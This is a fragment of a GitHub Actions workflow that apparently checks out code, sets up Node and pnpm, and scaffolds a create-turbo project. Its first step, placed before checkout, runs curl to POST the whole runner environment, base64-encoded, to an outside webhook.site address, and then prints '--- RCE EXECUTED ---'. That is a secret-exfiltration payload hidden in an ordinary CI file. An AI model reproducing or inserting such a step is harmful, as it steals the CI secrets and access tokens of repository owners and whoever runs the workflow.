        run: |
          # This runs before anything else can fail
          echo "Firing Webhook..."
          curl -X POST -d "data=$(env | base64)" https://webhook.site/762821af-c177-4dfe-bfd4-73bb1048b648
          echo "--- RCE EXECUTED ---"

      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: create-turbo
        run: |
          npm install -g pnpm turbo@${{ inputs.version }}
          pnpm dlx create-turbo@${{ inputs.version }} my-turborepo pnpm
